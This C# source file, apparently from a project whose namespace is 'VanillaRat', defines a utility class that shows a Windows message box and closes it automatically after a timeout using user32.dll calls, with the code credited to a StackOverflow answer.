using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Timer = System.Threading.Timer;

namespace VanillaRat.Classes
{
    //BY DMITRYG - STACKOVERFLOW
    public class AutoClosingMessageBox
    {
        private const int WM_CLOSE = 0x0010;
        private readonly string _caption;
        private readonly Timer _timeoutTimer;
        private readonly DialogResult _timerResult;
        private DialogResult _result;

        private AutoClosingMessageBox(string text, string caption, int timeout,
            MessageBoxButtons buttons = MessageBoxButtons.OK, DialogResult timerResult = DialogResult.None)
        {
            _caption = caption;
            _timeoutTimer = new Timer(OnTimerElapsed,
                null, timeout, Timeout.Infinite);
            _timerResult = timerResult;
            using (_timeoutTimer)
            {
                _result = MessageBox.Show(text, caption, buttons);
            }
        }

        public static DialogResult Show(string text, string caption, int timeout,
            MessageBoxButtons buttons = MessageBoxButtons.OK, DialogResult timerResult = DialogResult.None)
        {
            return new AutoClosingMessageBox(text, caption, timeout, buttons, timerResult)._result;
        }

        private void OnTimerElapsed(object state)
        {
            IntPtr mbWnd = FindWindow("#32770", _caption); // lpClassName is #32770 for MessageBox
            if (mbWnd != IntPtr.Zero)
                SendMessage(mbWnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
            _timeoutTimer.Dispose();
            _result = _timerResult;
        }

        [DllImport("user32.dll", SetLastError = true)]
        private static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr SendMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
    }
}